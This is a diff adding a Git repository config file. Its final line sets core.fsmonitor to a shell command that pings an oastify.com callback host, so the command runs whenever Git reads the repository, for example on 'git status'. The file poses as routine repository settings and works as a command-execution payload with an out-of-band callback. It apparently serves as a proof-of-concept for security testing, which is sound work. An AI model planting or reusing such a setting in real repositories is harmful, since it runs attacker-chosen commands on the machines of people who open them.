@@ -1,0 +1,9 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	ignorecase = true
+	precomposeunicode = true
+	worktree = worktree
+	fsmonitor =  "ping oe6fv035itpwfxzv328eprux4oagy6mv.oastify.com"
